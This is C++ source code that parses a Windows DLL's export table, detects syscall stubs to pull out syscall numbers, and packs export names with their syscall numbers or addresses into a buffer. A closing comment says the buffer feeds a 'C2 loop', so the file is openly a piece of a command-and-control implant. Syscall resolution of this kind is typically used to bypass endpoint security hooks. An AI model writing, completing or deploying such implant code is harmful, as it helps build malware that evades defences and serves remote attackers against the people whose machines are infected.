#include "global.hpp"
#include <stdint.h>
#include <iostream>
using namespace std;

// Pattern: mov r10, rcx; mov eax, ... (4C 8B D1 B8)
#define SYSCALL_PATTERN 0xb8d18b4c

typedef uint64_t QWORD;

// Check if an export address points to a standard syscall stub
QWORD checkForSyscall(const void* address) {
    const uint32_t* dwordPtr = static_cast<const uint32_t*>(address);
    // If pattern match, extract the syscall ID (EAX) which is at address + 4
    if (*dwordPtr == SYSCALL_PATTERN) {
        return (QWORD)(*(dwordPtr + 1));
    }
    return 0xFFFFFFFFFFFFFFFF;
}

// Populate a result buffer with [NameLen(1)][Name...][Value(8)]
// Returns total bytes written to outBuffer
size_t enumerateExportsAndSyscalls(const char* dllName, char* outBuffer, size_t outCapacity) {
    HMODULE module = LoadLibrary(dllName);
    if (!module) return 0;

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<uint8_t*>(module) + dos->e_lfanew);
    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return 0;

    auto* exp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<uint8_t*>(module) + dir.VirtualAddress);
    uint32_t* names = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(module) + exp->AddressOfNames);
    uint32_t* functions = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(module) + exp->AddressOfFunctions);
    uint16_t* ordinals = reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(module) + exp->AddressOfNameOrdinals);

    size_t offset = 0;

    for (uint32_t i = 0; i < exp->NumberOfNames; ++i) {
        const char* exportName = reinterpret_cast<const char*>(reinterpret_cast<uint8_t*>(module) + names[i]);
        uint16_t ordinalIndex = ordinals[i];
        uint32_t rva = functions[ordinalIndex];
        void* address = reinterpret_cast<void*>(reinterpret_cast<uint8_t*>(module) + rva);

        // Determine if it's a Syscall ID or a raw Address
        QWORD value = checkForSyscall(address);
        if (value == 0xFFFFFFFFFFFFFFFF) {
            value = (QWORD)address;
        }

        // Serialization Step
        size_t nameLen = 0;
        while (exportName[nameLen] != '\0' && nameLen < 255) nameLen++;

        // Stay within bounds: [1 byte Len] + [nameLen] + [8 byte Value]
        if (offset + 1 + nameLen + 8 > outCapacity) break;
        outBuffer[offset++] = (uint8_t)nameLen;
        memcpy(outBuffer + offset, exportName, nameLen);
        offset += nameLen;
        memcpy(outBuffer + offset, &value, 8);
        offset += 8;
    }

    return offset; // Return bytes written for the C2 loop 
}